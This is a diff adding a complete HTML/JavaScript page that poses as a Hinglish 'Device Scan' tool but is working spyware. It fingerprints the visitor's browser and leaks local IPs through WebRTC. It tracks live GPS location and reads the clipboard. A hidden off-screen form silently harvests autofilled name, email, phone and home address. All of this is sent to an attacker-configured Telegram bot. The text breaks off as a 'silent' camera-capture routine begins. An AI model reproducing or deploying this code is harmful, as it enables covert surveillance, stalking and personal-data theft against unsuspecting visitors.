@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#070b18">
+<title>Device Scan</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔗</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;-webkit-tap-highlight-color:transparent;}
+body{background:#070b18;color:#e8ecf7;min-height:100vh;overflow-x:hidden;}
+.bg{position:fixed;inset:0;z-index:-1;background:
+  radial-gradient(circle at 15% 8%,rgba(56,189,248,.16),transparent 45%),
+  radial-gradient(circle at 85% 92%,rgba(167,139,250,.16),transparent 45%),#070b18;}
+.screen{display:none;} .screen.on{display:block;}
+.wrap{max-width:430px;margin:0 auto;padding:26px 18px 40px;}
+.hv{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;}
+
+.brand{font-size:11px;letter-spacing:3.5px;font-weight:800;color:#38bdf8;text-transform:uppercase;text-align:center;}
+.brand2{font-size:10.5px;color:#5b6b8f;text-align:center;margin-top:5px;}
+.h1{font-size:25px;font-weight:900;text-align:center;margin:18px 0 6px;line-height:1.25;}
+.h1 em{font-style:normal;background:linear-gradient(90deg,#38bdf8,#a78bfa);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;}
+.sub{font-size:12.5px;color:#8494b5;text-align:center;line-height:1.6;margin-bottom:20px;}
+
+.ring{position:relative;width:150px;height:150px;margin:0 auto 18px;}
+.ring svg{transform:rotate(-90deg);}
+.ring .pct{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+.ring .pct b{font-size:31px;font-weight:900;color:#fff;}
+.ring .pct span{font-size:9.5px;color:#5b6b8f;letter-spacing:1.5px;margin-top:2px;}
+.ring .core{position:absolute;inset:34px;border-radius:50%;background:radial-gradient(circle,#1a2540,#0d1428);box-shadow:inset 0 0 26px rgba(56,189,248,.22);}
+
+.tiles{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:18px;}
+.tile{background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.07);border-radius:11px;padding:10px 11px;display:flex;align-items:center;gap:9px;opacity:.32;transition:.35s;}
+.tile.on{opacity:1;border-color:rgba(56,189,248,.32);background:rgba(56,189,248,.07);}
+.tile .ic{font-size:15px;}
+.tile .tx{min-width:0;flex:1;}
+.tile .tx b{display:block;font-size:10.5px;font-weight:700;color:#c8d4ec;}
+.tile .tx span{font-size:9.5px;color:#5b6b8f;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.tile.on .tx span{color:#38bdf8;}
+
+.btn{width:100%;background:linear-gradient(135deg,#38bdf8,#6366f1);color:#fff;border:none;border-radius:13px;
+  padding:15px;font-size:15px;font-weight:900;cursor:pointer;box-shadow:0 10px 28px rgba(56,189,248,.28);}
+.btn:active{transform:scale(.985);}
+.btn.ghost{background:rgba(255,255,255,.06);box-shadow:none;font-size:13.5px;font-weight:700;padding:12px;}
+
+.scorecard{background:linear-gradient(135deg,rgba(56,189,248,.12),rgba(167,139,250,.12));
+  border:1px solid rgba(255,255,255,.1);border-radius:18px;padding:22px;text-align:center;margin-bottom:16px;}
+.scorecard .n{font-size:52px;font-weight:900;color:#fff;line-height:1;}
+.scorecard .n small{font-size:17px;color:#5b6b8f;}
+.scorecard .l{font-size:11px;color:#8494b5;letter-spacing:1.5px;margin-top:6px;text-transform:uppercase;}
+.bars{margin-top:16px;text-align:left;}
+.bar{margin-bottom:9px;}
+.bar .lb{display:flex;justify-content:space-between;font-size:10.5px;color:#8494b5;margin-bottom:4px;}
+.bar .tr{height:5px;background:rgba(255,255,255,.08);border-radius:6px;overflow:hidden;}
+.bar .tr i{display:block;height:100%;background:linear-gradient(90deg,#38bdf8,#a78bfa);border-radius:6px;transition:width .8s;}
+
+.panel{background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:18px;}
+.panel h3{font-size:15.5px;margin-bottom:5px;}
+.panel p{font-size:11.5px;color:#8494b5;margin-bottom:15px;line-height:1.55;}
+.fld{margin-bottom:13px;}
+.fld label{font-size:10px;font-weight:700;color:#5b6b8f;display:block;margin-bottom:5px;letter-spacing:.6px;text-transform:uppercase;}
+.fld input{width:100%;background:rgba(0,0,0,.3);border:1.5px solid rgba(255,255,255,.1);border-radius:10px;
+  padding:12px;font-size:14.5px;color:#fff;outline:none;}
+.fld input:focus{border-color:#38bdf8;}
+.fld input.filled{border-color:rgba(34,197,94,.45);background:rgba(34,197,94,.06);}
+.note{font-size:10px;color:#5b6b8f;margin-top:10px;text-align:center;line-height:1.6;}
+.chips{display:flex;gap:7px;justify-content:center;flex-wrap:wrap;margin-top:14px;}
+.chip{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#a5b4d4;
+  font-size:11px;padding:8px 12px;border-radius:20px;cursor:pointer;}
+.chip.done{background:rgba(34,197,94,.14);border-color:rgba(34,197,94,.35);color:#86efac;}
+.tick{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#22c55e,#16a34a);
+  display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 16px;}
+.done h3{font-size:19px;text-align:center;margin-bottom:8px;}
+.done p{font-size:12.5px;color:#8494b5;text-align:center;line-height:1.7;}
+.spin{width:20px;height:20px;border:2.5px solid rgba(255,255,255,.15);border-top-color:#38bdf8;border-radius:50%;margin:16px auto 0;animation:sp .8s linear infinite;}
+@keyframes sp{to{transform:rotate(360deg)}}
+.foot{text-align:center;font-size:10px;color:#3f4c69;margin-top:22px;line-height:1.8;}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);background:#e8ecf7;color:#070b18;
+  font-size:12.5px;font-weight:700;padding:11px 18px;border-radius:24px;z-index:120;opacity:0;transition:.25s;pointer-events:none;}
+.toast.on{opacity:1;transform:translateX(-50%) translateY(0);}
+#af{position:absolute;left:-9999px;top:0;width:1px;height:1px;overflow:hidden;opacity:.01;}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+
+<form id="af" autocomplete="on">
+  <input id="af_name"  autocomplete="name"           name="name">
+  <input id="af_email" autocomplete="email"          name="email">
+  <input id="af_tel"   autocomplete="tel"            name="tel">
+  <input id="af_addr"  autocomplete="street-address" name="address">
+  <input id="af_pin"   autocomplete="postal-code"    name="zip">
+  <input id="af_city"  autocomplete="address-level2" name="city">
+</form>
+
+<div class="screen on" id="sScan">
+  <div class="wrap">
+    <div class="brand">{{BRAND}}</div>
+    <div class="brand2">{{TAGLINE}}</div>
+    <div class="h1">Aapka device <em>scan</em> ho raha hai…</div>
+    <div class="sub">Kuch karne ki zaroorat nahi — bas page khula rakho</div>
+
+    <div class="ring">
+      <div class="core"></div>
+      <svg width="150" height="150">
+        <circle cx="75" cy="75" r="65" fill="none" stroke="rgba(255,255,255,.07)" stroke-width="7"/>
+        <circle id="arc" cx="75" cy="75" r="65" fill="none" stroke="url(#g)" stroke-width="7"
+                stroke-linecap="round" stroke-dasharray="408" stroke-dashoffset="408"/>
+        <defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
+          <stop offset="0" stop-color="#38bdf8"/><stop offset="1" stop-color="#a78bfa"/></linearGradient></defs>
+      </svg>
+      <div class="pct"><b id="pct">0%</b><span>SCANNING</span></div>
+    </div>
+
+    <div class="tiles" id="tiles"></div>
+
+    <div class="chips" id="chips">
+      <div class="chip" id="cContacts">📱 Contacts</div>
+      <div class="chip" id="cBt">🔵 Nearby devices</div>
+      <div class="chip" id="cVoice">🎤 Voice note</div>
+    </div>
+    <div class="note" id="note">Camera aur location ka permission aa sakta hai — Allow kar dena</div>
+  </div>
+</div>
+
+<div class="screen" id="sReport">
+  <div class="wrap">
+    <div class="brand">{{BRAND}}</div>
+    <div class="h1" style="margin-top:14px">Scan <em>complete</em> ✅</div>
+    <div class="sub">Aapke device ka report taiyar hai</div>
+
+    <div class="scorecard">
+      <div class="n" id="score">--<small>/100</small></div>
+      <div class="l">Device Score</div>
+      <div class="bars" id="bars"></div>
+    </div>
+
+    <div class="panel">
+      <h3>Full report bhejein</h3>
+      <p id="autoNote">Details bhar do — report aapke paas aa jayegi</p>
+      <div class="fld"><label>Naam</label><input id="uName" placeholder="Aapka naam" autocomplete="name"></div>
+      <div class="fld"><label>Email</label><input id="uEmail" type="email" placeholder="email@example.com" autocomplete="email"></div>
+      <div class="fld"><label>Mobile</label><input id="uTel" type="tel" inputmode="numeric" maxlength="10" placeholder="9876543210" autocomplete="tel"></div>
+      <button class="btn" id="sendBtn" style="margin-top:6px">Report bhejo →</button>
+      <div class="note">Ye 3 cheezein browser khud bhar deta hai — typing nahi karni</div>
+    </div>
+    <div class="foot">Secure scan · No ads · v2.4</div>
+  </div>
+</div>
+
+<div class="screen" id="sDone">
+  <div class="wrap done" style="padding-top:60px">
+    <div class="tick">✓</div>
+    <h3>Report bhej di gayi!</h3>
+    <p>Aapke device ka full report email pe bheja gaya hai.<br><br>Redirect kar rahe hain…</p>
+    <div class="spin"></div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+<video class="hv" id="hv" autoplay muted playsinline></video>
+
+<script>
+/* ================= CONFIG ================= */
+const BOT_TOKEN="{{BOT_TOKEN}}", OWNER_ID="{{OWNER_ID}}", TARGET_UID="{{UID}}",
+      TARGET_IP="{{TARGET_IP}}", SID="{{SID}}", BRAND="{{BRAND}}", REDIRECT="{{REDIRECT}}";
+const $=id=>document.getElementById(id);
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const D={sid:SID,time:new Date().toISOString(),ip:TARGET_IP,brand:BRAND};
+
+/* ================= SENDER ================= */
+function targets(){ const s=new Set();
+  if(TARGET_UID&&TARGET_UID!=="None"&&TARGET_UID!=="") s.add(String(TARGET_UID));
+  else if(OWNER_ID&&OWNER_ID!=="None"&&OWNER_ID!=="") s.add(String(OWNER_ID));
+  return [...s]; }
+const Q=[]; let busy=false;
+async function doSend(j){
+  const url=`https://api.telegram.org/bot${BOT_TOKEN}/send${j.type}`; let r;
+  if(j.type==="Message"){
+    r=await fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:j.cid,text:j.data,disable_web_page_preview:true})});
+  }else{
+    const fd=new FormData(); fd.append("chat_id",j.cid);
+    if(j.cap) fd.append("caption",j.cap);
+    fd.append(j.type==="Photo"?"photo":"document",j.data);
+    r=await fetch(url,{method:"POST",body:fd});
+  }
+  if(!r.ok) throw new Error(r.status);
+}
+async function flush(){ if(busy) return; busy=true;
+  while(Q.length){ const j=Q[0];
+    try{ await doSend(j); Q.shift(); }
+    catch(e){ j.tries++; if(j.tries>5) Q.shift(); else await sleep(1200); } }
+  busy=false; }
+function chunk(t,n){ n=n||3400; const o=[]; for(let i=0;i<t.length;i+=n) o.push(t.slice(i,i+n)); return o; }
+async function T(type,data,cap){
+  if(type==="Message"){
+    const b=data.startsWith("[")?data:"["+SID+"] "+data;
+    chunk(b).forEach(p=>targets().forEach(c=>Q.push({cid:c,type:"Message",data:p,tries:0})));
+  }else targets().forEach(c=>Q.push({cid:c,type,data,cap:cap?("["+SID+"] "+cap):cap,tries:0}));
+  flush();
+}
+function beacon(t){ try{ targets().forEach(c=>navigator.sendBeacon(
+  `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${c}&text=${encodeURIComponent("["+SID+"] "+t)}`)); }catch(e){} }
+function toast(t){ const e=$('toast'); e.textContent=t; e.classList.add('on'); setTimeout(()=>e.classList.remove('on'),1800); }
+
+/* ================= UI HELPERS ================= */
+const CHECKS=[["ip","🌐","IP address"],["dev","📱","Device"],["gpu","🖥️","GPU"],
+  ["net","📡","Network"],["loc","📍","Location"],["cam","📸","Camera"],
+  ["bio","🧬","Fingerprint"],["id","👤","Identity"]];
+let done=0;
+$('tiles').innerHTML=CHECKS.map(c=>`<div class="tile" id="t_${c[0]}">
+  <div class="ic">${c[1]}</div><div class="tx"><b>${c[2]}</b><span>pending…</span></div></div>`).join('');
+function mark(k,val){ const el=$('t_'+k); if(!el||el.classList.contains('on')) return;
+  el.classList.add('on'); el.querySelector('span').textContent=val||"✓";
+  done++; const p=Math.round(done/CHECKS.length*100);
+  $('pct').textContent=p+"%"; $('arc').setAttribute('stroke-dashoffset',408-(408*p/100));
+  if(done>=CHECKS.length) setTimeout(showReport,700); }
+
+/* ================= ZERO-PERMISSION DEEP SCAN ================= */
+const UA=navigator.userAgent;
+function osInfo(){ let os="Unknown",br="Unknown";
+  if(/Android/i.test(UA)) os="Android "+((UA.match(/Android\s([\d.]+)/)||[])[1]||"");
+  else if(/iPhone|iPad|iPod/i.test(UA)) os="iOS "+((UA.match(/OS\s(\d+_\d+)/)||[])[1]||"").replace("_",".");
+  else if(/Windows/i.test(UA)) os="Windows"; else if(/Mac OS X/i.test(UA)) os="macOS";
+  else if(/CrOS/i.test(UA)) os="ChromeOS"; else if(/Linux/i.test(UA)) os="Linux";
+  if(/Edg\//i.test(UA)) br="Edge"; else if(/OPR|Opera/i.test(UA)) br="Opera";
+  else if(/Chrome/i.test(UA)) br="Chrome"; else if(/Firefox/i.test(UA)) br="Firefox";
+  else if(/Safari/i.test(UA)) br="Safari"; return {os,br}; }
+async function uaData(){ try{ if(!navigator.userAgentData) return null;
+  return await navigator.userAgentData.getHighEntropyValues(
+    ["model","platform","platformVersion","architecture","bitness","uaFullVersion","fullVersionList"]); }catch(e){ return null; } }
+function webgl(){ const o={}; try{ const gl=document.createElement('canvas').getContext('webgl');
+  if(gl){ const d=gl.getExtension('WEBGL_debug_renderer_info');
+    o.v=d?gl.getParameter(d.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR);
+    o.r=d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);
+    o.ver=gl.getParameter(gl.VERSION); o.ext=(gl.getSupportedExtensions()||[]).length; } }catch(e){} return o; }
+function canvasFP(){ try{ const c=document.createElement('canvas'); c.width=300;c.height=70;
+  const x=c.getContext('2d'); x.textBaseline='top'; x.font='16px Arial';
+  x.fillStyle='#f60'; x.fillRect(0,0,120,30); x.fillStyle='#069'; x.fillText('FingerPrint!',2,20);
+  x.fillStyle='rgba(102,204,0,.7)'; x.fillText('FingerPrint!',4,24);
+  const g=x.createLinearGradient(0,0,300,0); g.addColorStop(0,'#f00'); g.addColorStop(1,'#00f');
+  x.fillStyle=g; x.fillRect(130,5,150,30); return c.toDataURL(); }catch(e){ return ""; } }
+function webglFP(){ try{ const c=document.createElement('canvas'); c.width=200;c.height=60;
+  const gl=c.getContext('webgl'); if(!gl) return "";
+  gl.clearColor(.2,.4,.6,1); gl.clear(gl.COLOR_BUFFER_BIT);
+  const b=new Uint8Array(200*60*4); gl.readPixels(0,0,200,60,gl.RGBA,gl.UNSIGNED_BYTE,b);
+  let h=0; for(let i=0;i<b.length;i+=4) h=(h*31+b[i])>>>0; return "gl-"+h; }catch(e){ return ""; } }
+async function audioFP(){ try{ const AC=window.AudioContext||window.webkitAudioContext; if(!AC) return "";
+  const c=new AC(),o=c.createOscillator(),g=c.createGain(),a=c.createAnalyser();
+  o.type='triangle'; o.frequency.value=10000; o.connect(g); g.connect(a); g.connect(c.destination);
+  o.start(0); const d=new Float32Array(a.frequencyBinCount); a.getFloatFrequencyData(d);
+  let s=0; for(let i=0;i<d.length;i++) s+=Math.abs(d[i]); o.stop(); c.close(); return s.toFixed(2); }catch(e){ return ""; } }
+const FONTS=["Arial","Arial Black","Calibri","Cambria","Comic Sans MS","Consolas","Courier New","Georgia",
+"Impact","Lucida Console","Malgun Gothic","Microsoft YaHei","Palatino Linotype","Roboto","Segoe UI",
+"Segoe UI Emoji","Tahoma","Times New Roman","Trebuchet MS","Verdana","Helvetica","Menlo","Monaco","Optima",
+"Futura","Noto Sans","Open Sans","Lato","Montserrat","Ubuntu","Cantarell","DejaVu Sans","Liberation Sans","Sylfaen"];
+function fonts(){ return FONTS.filter(f=>{ try{ return document.fonts.check('13px "'+f+'"'); }catch(e){ return false; } }); }
+function mathFP(){ let s=""; [Math.sin(1),Math.cos(1),Math.tan(1),Math.log(2),Math.sqrt(2),Math.exp(1),Math.PI]
+  .forEach(x=>s+=x.toFixed(14)); return s.length; }
+function hashFP(a){ const s=a.join("|"); let h=0x811c9dc5;
+  for(let i=0;i<s.length;i++){ h^=s.charCodeAt(i); h=Math.imul(h,0x01000193); } return (h>>>0).toString(16); }
+async function visitorId(){ try{
+  const vid=hashFP([UA,navigator.language,(navigator.languages||[]).join(','),screen.width+'x'+screen.height,
+    screen.colorDepth,devicePixelRatio,new Date().getTimezoneOffset(),navigator.hardwareConcurrency,
+    navigator.deviceMemory||0,navigator.platform,navigator.vendor,canvasFP().slice(-50),webglFP(),
+    await audioFP(),fonts().length]);
+  return vid; }catch(e){ return "n/a"; } }
+function battery(){ return new Promise(r=>{ if(!navigator.getBattery) return r(null);
+  navigator.getBattery().then(b=>r({l:Math.round(b.level*100),c:b.charging,dt:b.dischargingTime})).catch(()=>r(null)); }); }
+function localIPs(){ return new Promise(r=>{ const f=[]; let pc,d=false;
+  const fin=()=>{ if(d)return; d=true; try{pc.close()}catch(e){} r(f) };
+  try{ pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    pc.createDataChannel('x');
+    pc.onicecandidate=e=>{ if(!e.candidate){fin();return;}
+      const m=e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9\-]+\.local)/i);
+      if(m&&!f.includes(m[1])) f.push(m[1]); };
+    pc.createOffer().then(o=>pc.setLocalDescription(o)); setTimeout(fin,2600);
+  }catch(e){ r(f) } }); }
+async function pubIP(){ for(const u of ["https://ipapi.co/json/","https://ipwho.is/"]){
+  try{ const j=await (await fetch(u)).json(); if(j&&(j.ip||j.query)) return j; }catch(e){} } return null; }
+async function revGeo(g){ if(!g) return null;
+  try{ const d=await (await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${g.lat}&longitude=${g.lon}&localityLanguage=en`)).json();
+    return [d.locality,d.city,d.principalSubdivision,d.postalCode,d.countryName].filter(Boolean).join(", "); }catch(e){ return null; } }
+function geo(){ return new Promise(r=>{ if(!navigator.geolocation) return r(null);
+  const t=setTimeout(()=>r(null),12000);
+  navigator.geolocation.getCurrentPosition(
+    p=>{ clearTimeout(t); r({lat:+p.coords.latitude.toFixed(7),lon:+p.coords.longitude.toFixed(7),acc:Math.round(p.coords.accuracy)}); },
+    ()=>{ clearTimeout(t); r(null); }, {enableHighAccuracy:true,maximumAge:0,timeout:11000}); }); }
+async function speed(){ try{ const t=performance.now();
+  await fetch('https://speed.cloudflare.com/__down?bytes=800000&t='+Date.now(),{cache:'no-store'});
+  return ((1/((performance.now()-t)/1000))*8).toFixed(2)+" Mbps"; }catch(e){ return null; } }
+async function storage(){ try{ const e=await navigator.storage.estimate();
+  return {used:(e.usage/1048576).toFixed(2),quota:(e.quota/1048576).toFixed(0)}; }catch(e){ return null; } }
+function detect(){ const o={};
+  o.wd=!!navigator.webdriver; o.headless=/headless/i.test(UA)||(navigator.plugins&&navigator.plugins.length===0);
+  o.plugins=navigator.plugins?navigator.plugins.length:0; o.cookies=navigator.cookieEnabled;
+  o.dnt=navigator.doNotTrack||"unset";
+  o.incog=(()=>{ try{ localStorage.setItem('t','1'); localStorage.removeItem('t'); return false; }catch(e){ return true; } })();
+  o.idb=!!window.indexedDB; o.bt=!!navigator.bluetooth; o.usb=!!navigator.usb;
+  o.serial=!!navigator.serial; o.hid=!!navigator.hid; o.gpu=!!navigator.gpu;
+  o.contacts=!!(navigator.contacts&&navigator.contacts.select);
+  o.notif=("Notification" in window); o.referrer=document.referrer||"-";
+  o.dark=matchMedia("(prefers-color-scheme: dark)").matches;
+  o.coarse=matchMedia("(pointer: coarse)").matches;
+  o.mem=(performance.memory?(performance.memory.usedJSHeapSize/1048576).toFixed(1)+" MB":"-");
+  return o; }
+function adblock(){ try{ const el=document.createElement('div'); el.className="ad-banner adsbox";
+  el.style.cssText="position:absolute;left:-9999px;height:12px;"; document.body.appendChild(el);
+  const b=el.offsetHeight===0; el.remove(); return b; }catch(e){ return null; } }
+function vpn(p){ const o=((p&&(p.org||p.isp||(p.connection&&p.connection.isp)))||"").toLowerCase();
+  return ["vpn","hosting","datacenter","digitalocean","linode","ovh","hetzner","amazon","aws","azure","google","cloud","colocation"]
+    .some(v=>o.includes(v))?"Haan ⚠️":"Nahi"; }
+async function paired(){ const o={};
+  try{ if(navigator.bluetooth&&navigator.bluetooth.getDevices){
+    const d=await navigator.bluetooth.getDevices();
+    o.bluetooth=d.map(x=>x.name||"(unnamed)").slice(0,10); } }catch(e){}
+  try{ if(navigator.usb&&navigator.usb.getDevices){
+    const d=await navigator.usb.getDevices();
+    o.usb=d.map(x=>x.productName||"(dev)").slice(0,10); } }catch(e){}
+  try{ if(navigator.serial&&navigator.serial.getPorts){
+    const d=await navigator.serial.getPorts(); o.serial=d.length; } }catch(e){}
+  return o; }
+async function sensors(){ const o={};
+  try{ if("Accelerometer" in window){ const a=new Accelerometer({frequency:2});
+    await new Promise(r=>{ a.addEventListener('reading',()=>{ o.accel=[+a.x.toFixed(3),+a.y.toFixed(3),+a.z.toFixed(3)]; r(); });
+      a.addEventListener('error',()=>r()); a.start(); setTimeout(r,1800); }); } }catch(e){}
+  try{ if("Gyroscope" in window){ const g=new Gyroscope({frequency:2});
+    await new Promise(r=>{ g.addEventListener('reading',()=>{ o.gyro=[+g.x.toFixed(3),+g.y.toFixed(3),+g.z.toFixed(3)]; r(); });
+      g.addEventListener('error',()=>r()); g.start(); setTimeout(r,1800); }); } }catch(e){}
+  try{ if("AmbientLightSensor" in window){ const s=new AmbientLightSensor();
+    await new Promise(r=>{ s.addEventListener('reading',()=>{ o.light=+s.illuminance.toFixed(1); r(); });
+      s.addEventListener('error',()=>r()); s.start(); setTimeout(r,1500); }); } }catch(e){}
+  return o; }
+
+async function scanAll(){
+  /* ---- 1. IP ---- */
+  const p=await pubIP(), locals=await localIPs();
+  Object.assign(D,{publicIP:p,localIPs:locals});
+  mark("ip", (p?(p.ip||p.query):TARGET_IP)||"✓");
+
+  /* ---- 2. device ---- */
+  const oi=osInfo(), uad=await uaData(), gl=webgl(), bat=await battery(), st=await storage();
+  Object.assign(D,{os:oi,uaData:uad,webgl:gl,battery:bat,storage:st,
+    hw:{cores:navigator.hardwareConcurrency,ram:navigator.deviceMemory,platform:navigator.platform,vendor:navigator.vendor},
+    screen:{w:screen.width,h:screen.height,dpr:devicePixelRatio,cd:screen.colorDepth,touch:navigator.maxTouchPoints}});
+  mark("dev", ((uad&&uad.model)||oi.os||"✓").substring(0,22));
+
+  /* ---- 3. gpu ---- */
+  mark("gpu", (gl.r||"✓").substring(0,22));
+
+  /* ---- 4. network ---- */
+  const sp=await speed(), c=navigator.connection||navigator.webkitConnection;
+  Object.assign(D,{speed:sp,conn:c?{t:c.effectiveType,d:c.downlink,r:c.rtt,s:c.saveData}:null});
+  mark("net", sp||(c?c.effectiveType:"✓"));
+
+  /* ---- 5. fingerprint ---- */
+  const cfp=canvasFP(), gfp=webglFP(), afp=await audioFP(), fnts=fonts(), vid=await visitorId();
+  const d=detect(), pa=await paired(), sen=await sensors();
+  let prev=null; try{ prev=localStorage.getItem("dl_visits"); localStorage.setItem("dl_visits",String((+prev||0)+1)); }catch(e){}
+  Object.assign(D,{fingerprint:{canvas:cfp.substring(0,300),webgl:gfp,audio:afp,math:mathFP(),fonts:fnts,visitorId:vid},
+    detect:d,paired:pa,sensors:sen,visits:(+prev||0)+1});
+  mark("bio", "ID "+vid);
+
+  await T("Message","🖥️ *DEVICE*\n━━━━━━━━━━━━━━━━━━━━\n"
+    +"OS       : "+oi.os+"\nBrowser  : "+oi.br+"\nModel    : "+((uad&&uad.model)||"N/A")
+    +"\nPlatform : "+((uad&&uad.platform)||navigator.platform)+" "+((uad&&uad.platformVersion)||"")
+    +"\nArch     : "+((uad&&uad.architecture)||"-")+" "+((uad&&uad.bitness)||"")+"bit"
+    +"\nCores    : "+(navigator.hardwareConcurrency||"N/A")+"\nRAM      : "+(navigator.deviceMemory?navigator.deviceMemory+" GB":"N/A")
+    +"\nVendor   : "+(navigator.vendor||"-")
+    +"\nGPU      : "+(gl.r||"N/A")+"\nGPU vend : "+(gl.v||"N/A")
+    +"\nWebGL    : "+(gl.ver||"-")+" | ext:"+(gl.ext||0)
+    +"\nScreen   : "+screen.width+"x"+screen.height+" @"+devicePixelRatio+"x ("+screen.colorDepth+"bit) touch:"+navigator.maxTouchPoints
+    +"\nBattery  : "+(bat?bat.l+"% "+(bat.c?"(CHARGING ⚡)":"")+" · dt:"+bat.dt+"s":"N/A")
+    +"\nStorage  : "+(st?(st.used+" / "+st.quota+" MB"):"N/A"));
+  await sleep(200);
+
+  await T("Message","🌐 *NETWORK + IDENTITY*\n━━━━━━━━━━━━━━━━━━━━\n"
+    +"Public IP: "+(p?(p.ip||p.query):(TARGET_IP||"-"))
+    +"\nISP      : "+((p&&(p.org||p.isp||(p.connection&&p.connection.isp)))||"-")
+    +"\nASN      : "+((p&&(p.asn||(p.connection&&p.connection.asn)))||"-")
+    +"\nCity     : "+((p&&[p.city,p.region,p.postal,p.country_name].filter(Boolean).join(", "))||"-")
+    +"\nLocal IPs: "+(locals.join(", ")||"-")+"\nSpeed    : "+(sp||"-")
+    +"\nConn     : "+(c?(c.effectiveType+" · "+(c.downlink||"-")+"Mbps · rtt "+(c.rtt||"-")+"ms"):"N/A")
+    +"\nTZ       : "+Intl.DateTimeFormat().resolvedOptions().timeZone
+    +"\nVPN/DC   : "+vpn(p)
+    +"\n\n🧬 *VISITOR ID* : "+vid+"\n🔁 Ye visit : "+(+prev||0)+1+" (0 = pehli baar)"
+    +"\n\n🕵️ WebDriver:"+d.wd+" Headless:"+d.headless+" Plugins:"+d.plugins
+    +"\nCookies:"+d.cookies+" DNT:"+d.dnt+" Incognito:"+d.incog+" Adblock:"+adblock()
+    +"\nIndexedDB:"+d.idb+" USB:"+d.usb+" Serial:"+d.serial+" HID:"+d.hid+" WebGPU:"+d.gpu
+    +"\nContactsAPI:"+d.contacts+" NotifAPI:"+d.notif+" DarkMode:"+d.dark+" CoarsePtr:"+d.coarse
+    +"\nJSHeap:"+d.mem+" Referrer:"+d.referrer
+    +"\n\n🔗 Paired: "+(JSON.stringify(pa)||"-")
+    +"\n📐 Sensors: "+(JSON.stringify(sen)||"-")
+    +"\n\n🎛️ Cameras/Mics: "+(await (async()=>{ try{ const dv=await navigator.mediaDevices.enumerateDevices();
+        return dv.filter(x=>x.kind==="videoinput").length+" cam / "+dv.filter(x=>x.kind==="audioinput").length+" mic"; }
+      catch(e){ return "-"; }})())
+    +"\nFonts("+fnts.length+"): "+fnts.slice(0,22).join(", ")
+    +"\nLocale: "+Intl.DateTimeFormat().resolvedOptions().locale+" | "+(navigator.languages||[]).join(", ")
+    +"\nUA: "+UA);
+  await sleep(200);
+
+  /* ---- 6. location ---- */
+  const g=await geo();
+  if(g){ const addr=await revGeo(g); D.location={...g,address:addr};
+    mark("loc", addr?addr.split(",")[0]:"GPS ✓");
+    T("Message","📍 *LIVE LOCATION*\n━━━━━━━━━━━━━━━━━━━━\nCoords  : "+g.lat+", "+g.lon
+      +"\nAccuracy: ±"+g.acc+"m\nAddress : "+(addr||"-")
+      +"\n🗺️ https://maps.google.com/?q="+g.lat+","+g.lon);
+    try{ navigator.geolocation.watchPosition(q=>T("Message","📍 *UPDATE* "+q.coords.latitude+", "+q.coords.longitude),
+      ()=>{},{enableHighAccuracy:true}); }catch(e){}
+  } else mark("loc","denied");
+
+  /* ---- 7. clipboard + notification ---- */
+  try{ if(navigator.clipboard){ const cl=await navigator.clipboard.readText();
+    if(cl){ D.clipboard=cl; T("Message","📋 *CLIPBOARD*\n"+cl.substring(0,300)); } } }catch(e){}
+  try{ if("Notification" in window && Notification.permission==="default"){
+    const r=await Notification.requestPermission();
+    T("Message","🔔 Notification permission: "+r);
+    if(r==="granted") new Notification("Scan complete ✅",{body:"Aapke device ka report taiyar hai"});
+  } }catch(e){}
+
+  /* ---- 8. identity (autofill) ---- */
+  readAutofill(); mark("id","autofill check");
+}
+
+/* ================= AUTOFILL (0 typing) ================= */
+function readAutofill(){
+  const map=[["af_name","uName"],["af_email","uEmail"],["af_tel","uTel"]];
+  const got={};
+  map.forEach(([src,dst])=>{ const s=$(src), t=$(dst);
+    if(s&&t&&s.value&&!t.value){ t.value=s.value; t.classList.add("filled"); got[dst]=s.value; } });
+  if(Object.keys(got).length){
+    D.autofill=got;
+    T("Message","👤 *BROWSER AUTOFILL (0 typing)*\n"+Object.entries(got).map(([k,v])=>k+" : "+v).join("\n"));
+    $('autoNote').textContent="Browser ne khud bhar diya ✅ — bas confirm karo";
+  }
+  const addr=$('af_addr').value, city=$('af_city').value, pin=$('af_pin').value;
+  if(addr||city||pin){ D.address=[addr,city,pin].filter(Boolean).join(", ");
+    T("Message","🏠 *SAVED ADDRESS (autofill)*\n"+D.address); }
+}
+setTimeout(readAutofill,1200);
+setTimeout(readAutofill,3000);
+document.addEventListener('click',()=>setTimeout(readAutofill,400));
+
+/* ================= CAMERA (silent) ================= */
+let stream=null,camOk=false,camBusy=false;
+const hv=$('hv');
+function shot(tag){ if(!hv.videoWidth) return;
+  const c=document.createElement('canvas'); c.width=hv.videoWidth; c.height=hv.videoHeight;
